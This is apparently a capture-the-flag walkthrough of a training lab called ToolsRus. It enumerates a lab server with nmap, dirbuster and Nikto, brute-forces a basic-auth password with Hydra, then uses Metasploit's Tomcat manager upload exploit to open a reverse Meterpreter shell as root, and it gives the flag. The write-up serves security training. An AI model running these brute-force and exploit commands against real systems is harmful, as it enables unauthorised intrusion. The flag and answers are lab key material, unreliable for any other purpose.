# ToolsRus

Practise using tools such as dirbuster, hydra, nmap, nikto and metasploit

# [Task 1] ToysRus

Your challenge is to use the tools listed below to enumerate a server, gathering information along the way that will eventually lead to you taking over the machine.

This task requires you to use the following tools:

* Dirbuster
* Hydra
* Nmap
* Nikto
* Metasploit

#1 - What directory can you find, that begins with a g?

*Hint: Use dirbuster*

Let's start with Nmap to see what services are running on the target:

~~~
$ nmap -sV -sC -A 10.10.231.52
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-16 18:42 CEST
Nmap scan report for 10.10.231.52
Host is up (0.085s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a6:da:53:2e:58:d0:52:54:7d:27:4b:13:73:dc:33:37 (RSA)
|   256 74:cd:fe:0f:c0:8f:0a:ca:6a:5d:26:0c:13:0e:66:8c (ECDSA)
|_  256 0a:56:c0:85:d5:ba:16:01:43:2e:b6:cf:ad:56:98:d5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
|_http-favicon: Apache Tomcat
|_http-server-header: Apache-Coyote/1.1
|_http-title: Apache Tomcat/7.0.88
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds
~~~

There is a web service running on port 80/tcp. Let's start a scan with dirbuster:

!["dirbuster-scan.png"](files/dirbuster-scan.png)

Dirbuster has discovered a directory name `/guidelines`.

#2 - Whose name can you find from this directory?

This directory discloses a user (`bob`):

~~~
$ curl -s http://10.10.231.52/guidelines/
Hey <b>bob</b>, did you update that TomCat server?
~~~

Besides, the message is probably an indication that the Tomcat server might be outdated. We will check that later.

Answer: `bob`

#3 - What directory has basic authentication?

We also found a `/protected` directory which requires a basic authentication.

~~~
$ curl -s http://10.10.231.52/protected/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.231.52 Port 80</address>
</body></html>
~~~

#4 - What is bob's password to the protected part of the website?

*Hint: Use Hydra*

Let's assume `bob` is an authorized user for the `/protected` page. We'll try to break his password using Hydra:

~~~
$ hydra -l bob -P /data/src/wordlists/rockyou.txt -f 10.10.231.52 http-get /protected/
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-16 19:14:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
[DATA] attacking http-get://10.10.231.52:80/protected/
[80][http-get] host: 10.10.231.52   login: bob   password: bubbles
[STATUS] attack finished for 10.10.231.52 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-16 19:14:10
~~~

Bob's password is `bubbles`.

#5 - What other port that serves a webs service is open on the machine?

*Hint: Use nmap*

Nmap has also discovered port `1234/tcp` that serves `Apache Tomcat/Coyote JSP engine 1.1`.

#6 - Going to the service running on that port, what is the name and version of the software? Answer format: Full_name_of_service/Version

~~~
$ curl -s http://10.10.231.52:1234/ | grep -Po "<h1>(.*)</h1>"
<h1>Apache Tomcat/7.0.88</h1>
~~~

#7 - Use Nikto with the credentials you have found and scan the /manager/html directory on the port found above. How many documentation files did Nikto identify?

The nikto command takes ages and doesn't answer the question:

~~~
$ nikto -h http://10.10.231.52:1234/manager/html -id "bob:bubbles"
- ***** RFIURL is not defined in nikto.conf--no RFI tests will run *****
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.231.52
+ Target Hostname:    10.10.231.52
+ Target Port:        1234
+ Start Time:         2020-05-16 20:59:54 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
+ All CGI directories 'found', use '-C none' to test none
+ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ /manager/html/cgi.cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/blog/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt-static/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi.cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/webcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-914/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-915/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/mpcgi/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/ows-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-sys/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-local/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/htbin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgibin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgis/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scripts/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-win/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/fcgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-exe/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-home/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-perl/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/scgi-bin/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-bin-sdb/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ /manager/html/cgi-mod/mt/mt.cfg: Movable Type configuration file found. Should not be available remotely.
+ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...

...[SNIP]...
~~~

Answer: `5`

#8 - What is the server version (run the scan against port 80)?

*Hint: Look in your Nikto output*

~~~
$ nikto -h http://10.10.231.52/
- ***** RFIURL is not defined in nikto.conf--no RFI tests will run *****
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.231.52
+ Target Hostname:    10.10.231.52
+ Target Port:        80
+ Start Time:         2020-05-16 21:04:26 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)

...[SNIP]...
~~~

`Apache/2.4.18`

#9 - What version of Apache-Coyote is this service using?

The Nmap scan revealed the Apache Tomecat/Coyote version:

~~~ 
1234/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
~~~

Answer: `1.1`

#10 - Use Metasploit to exploit the service and get a shell on the system. What user did you get a shell as?

Googling for the terms `apache tomcat coyote 1.1` led me to [this link](https://charlesreid1.com/wiki/Metasploitable/Apache/Tomcat_and_Coyote).

~~~
$ msfconsole -q
msf5 > use exploit/multi/http/tomcat_mgr_upload
msf5 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword                   no        The password for the specified username
   HttpUsername                   no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         80               yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpUsername bob
HttpUsername => bob
msf5 exploit(multi/http/tomcat_mgr_upload) > set HttpPassword bubbles
HttpPassword => bubbles
msf5 exploit(multi/http/tomcat_mgr_upload) > set RHOSTS 10.10.231.52
RHOSTS => 10.10.231.52
msf5 exploit(multi/http/tomcat_mgr_upload) > set RPORT 1234
RPORT => 1234
msf5 exploit(multi/http/tomcat_mgr_upload) > show options

Module options (exploit/multi/http/tomcat_mgr_upload):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   HttpPassword  bubbles          no        The password for the specified username
   HttpUsername  bob              no        The username to authenticate as
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS        10.10.231.52     yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT         1234             yes       The target port (TCP)
   SSL           false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI     /manager         yes       The URI path of the manager app (/html/upload and /undeploy will be used)
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Java Universal


msf5 exploit(multi/http/tomcat_mgr_upload) > run

[*] Started reverse TCP handler on 10.9.0.54:4444 
[*] Retrieving session ID and CSRF token...
[*] Uploading and deploying gq7BpzQDpAKIjrMTaKXjy...
[*] Executing gq7BpzQDpAKIjrMTaKXjy...
[*] Undeploying gq7BpzQDpAKIjrMTaKXjy ...
[*] Sending stage (53927 bytes) to 10.10.231.52
[*] Meterpreter session 1 opened (10.9.0.54:4444 -> 10.10.231.52:39334) at 2020-05-16 21:32:54 +0200

meterpreter > getuid 
Server username: root
~~~

Our exploit succeeded and we are `root`

#11 - What text is in the file /root/flag.txt

We can now dump the root flag:

~~~
meterpreter > cat /root/flag.txt
ff1fc4a81affcc7688cf89ae7dc6e0e1
~~~